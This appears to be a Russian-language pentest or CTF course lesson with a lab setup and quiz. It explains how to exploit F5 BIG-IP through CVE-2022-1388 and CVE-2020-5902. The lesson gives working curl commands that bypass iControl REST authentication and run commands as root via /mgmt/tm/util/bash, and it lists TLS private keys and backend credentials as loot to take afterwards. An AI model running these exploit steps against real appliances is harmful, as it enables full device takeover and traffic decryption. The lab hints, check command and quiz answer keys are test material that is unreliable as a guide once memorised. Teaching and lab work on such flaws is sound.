---
id: web-f5-bigip
title: 'F5 BIG-IP: CVE-2022-1388 (iControl REST auth bypass → RCE)'
category: web
parent: web-edge-appliances
difficulty: hard
order: 1
tags: [f5, bigip, icontrol, rest, cve-2022-1388, cve-2020-5902, rce]
prerequisites: [web-edge-appliances]
useful_for:
  - 'CTF Web категория'
  - 'Bug bounty'
  - 'Пентест веб-приложений'
estimated_minutes: 80
summary: 'F5 BIG-IP как цель: iControl REST, обход аутентификации через X-F5-Auth-Token (CVE-2022-1388), RCE через /mgmt/tm/util/bash, TMUI RCE CVE-2020-5902.'
lab:
  kind: shell
  title: 'Практика: auth bypass iControl REST → RCE'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Прочитай task.md: там адрес BIG-IP и путь управления `/mgmt/tm/util/bash`.'
    - 'Обход — через заголовок `X-F5-Auth-Token` с пустым значением и `Connection: X-F5-Auth-Token`.'
    - 'Отправь POST на `/mgmt/tm/util/bash` с телом `{"command":"run","utilCmdArgs":"-c id"}`.'
    - 'В ответе — вывод команды с флагом; сохрани в found.txt и набери `check`.'
---

## Вопрос, с которого всё начинается

На периметре стоит балансировщик F5 BIG-IP. Через него идёт весь трафик к внутренним сервисам, а управляется он через REST-API **iControl**. В 2022 году нашли CVE-2022-1388: обход аутентификации в этом API, после которого одна команда даёт RCE. Разберём, как это работает.

## Что такое F5 BIG-IP и iControl REST

**F5 BIG-IP** — это балансировщик нагрузки и application delivery controller. Он распределяет трафик между серверами, терминирует TLS, делает WAF. Управление — через **iControl REST**: набор эндпоинтов под `/mgmt/tm/`, через которые настраиваются пулы, виртуальные серверы, правила.

Ключевой для нас эндпоинт — `/mgmt/tm/util/bash`. Это легитимный служебный эндпоинт: он позволяет выполнить команду оболочки на устройстве (используется для администрирования). Если до него добраться без аутентификации — это готовый RCE.

## Наш пример: BIG-IP 16.1.0

Цель — `https://bigip.target.example`. Определяем продукт:

```
$ curl -s -k -I https://bigip.target.example/tmui/login.jsp | grep -i server
Server: BIG-IP
Set-Cookie: BIGIPAuthCookie=...
```

Версию уточняем по `/mgmt/tm/sys/version` (если доступ) или по статике. Диапазон CVE-2022-1388: 16.1.0–16.1.2, 15.1.0–15.1.5, 14.1.0–14.1.4, 13.1.0–13.1.4.

## Шаг 1: понять обход аутентификации

CVE-2022-1388 — это **header trust abuse**. BIG-IP проверяет аутентификацию через заголовок `X-F5-Auth-Token`. Если запрос приходит с заголовком `Connection: X-F5-Auth-Token` (что говорит прокси «не пересылай этот заголовок»), то внутренний компонент видит пустой токен и **пропускает запрос** как доверенный. То есть баг в логике доверия к заголовку, а не в криптографии.

## Шаг 2: подтвердить обход

Проверяем неразрушающе — запрашиваем безобидный служебный эндпоинт:

```
$ curl -s -k 'https://bigip.target.example/mgmt/tm/util/bash' \
  -H 'Connection: X-F5-Auth-Token' \
  -H 'X-F5-Auth-Token: ' -o /dev/null -w '%{http_code}\n'
200
```

Ответ `200` без логина — обход подтверждён. (Обычно без токена здесь был бы `401`.)

## Шаг 3: выполнить команду

Теперь отправляем команду через тот же эндпоинт:

```
$ curl -s -k -X POST 'https://bigip.target.example/mgmt/tm/util/bash' \
  -H 'Connection: X-F5-Auth-Token' \
  -H 'X-F5-Auth-Token: ' \
  -H 'Content-Type: application/json' \
  --data-binary '{"command":"run","utilCmdArgs":"-c id"}'
```

Ответ содержит вывод команды:

```
{
  "kind": "tm:util:bash:runstate",
  "commandResult": "uid=0(root) gid=0(root) groups=0(root)\n"
}
```

`uid=0` — мы выполнили код от **root**. Это полный контроль над балансировщиком.

## Шаг 4: второй вектор — TMUI CVE-2020-5902

Если версия старая (11.x–15.1.0), есть ещё CVE-2020-5902: RCE через **TMUI** (веб-интерфейс управления) с обходом пути:

```
$ curl -s -k 'https://bigip.target.example/tmui/login.jsp/..%2f..%2ftmui/..%2fmgmt/tm/util/bash' ...
```

Баг в неверной нормализации пути (`..%2f`). Оба вектора ведут к одному — выполнению команд от root.

## Шаг 5: пост-эксплуатация

BIG-IP хранит много ценного:

- `/config/bigip.conf` — конфигурация со всеми виртуальными серверами и пулами.
- `/config/bigip_ssl.key` и сертификаты — приватные ключи TLS (перехват трафика!).
- Креды к бэкенд-серверам и мониторингу.
- Правила iRules (могут содержать логику с секретами).

С приватными ключами можно расшифровывать трафик — это критично.

## Шаг 6: если пропатчен

Смотрим CVE-2023-46747 (AJP-обход → RCE), CVE-2023-22374, CVE-2021-22986. F5 — большая поверхность. И всегда проверяй версию: она определяет, какой из десятков CVE применим.

## Что мы теперь знаем

- F5 BIG-IP управляется через iControl REST (`/mgmt/tm/`).
- `/mgmt/tm/util/bash` — легитимный RCE-эндпоинт.
- CVE-2022-1388 — обход аутентификации через заголовки (header trust abuse).
- CVE-2020-5902 — RCE через TMUI (traversal).
- После RCE — приватные ключи TLS и конфиги.

## Квиз

Проверь себя.

```quiz
- question: "Что такое iControl REST?"
  options:
    - "Протокол почты"
    - "REST-API управления F5 BIG-IP под /mgmt/tm/"
    - "Тип файла"
    - "База данных"
  answer: 1
  explanation: "Через него настраивается устройство."
- question: "В чём суть CVE-2022-1388?"
  options:
    - "XSS"
    - "Обход аутентификации через заголовки (X-F5-Auth-Token / Connection)"
    - "SQLi"
    - "CSRF"
  answer: 1
  explanation: "Header trust abuse."
- question: "Какой эндпоинт даёт выполнение команд?"
  options:
    - "/index.html"
    - "/mgmt/tm/util/bash"
    - "/robots.txt"
    - "/favicon.ico"
  answer: 1
  explanation: "Служебный эндпоинт выполнения bash."
- question: "Что особенно ценно в конфиге BIG-IP?"
  options:
    - "Картинки"
    - "Приватные ключи TLS и конфиги бэкендов"
    - "README"
    - "логи"
  answer: 1
  explanation: "Ключи позволяют расшифровывать трафик."
- question: "Почему сначала проверяют, а потом эксплуатируют?"
  options:
    - "Так веселее"
    - "Чтобы не уронить шлюз на периметре"
    - "Так быстрее"
    - "Так просит F5"
  answer: 1
  explanation: "Падение шлюза = потеря доступа для всех."
```

## Куда дальше

Дальше — Fortinet SSL-VPN и traversal к сессиям. А пока запомни: **F5 = iControl REST; CVE-2022-1388 обходит аутентификацию через заголовки.**

## Где пригодится

- Пентест периметра и балансировщиков.
- Red team: RCE на edge-устройстве.
- CTF: задания на header trust abuse.
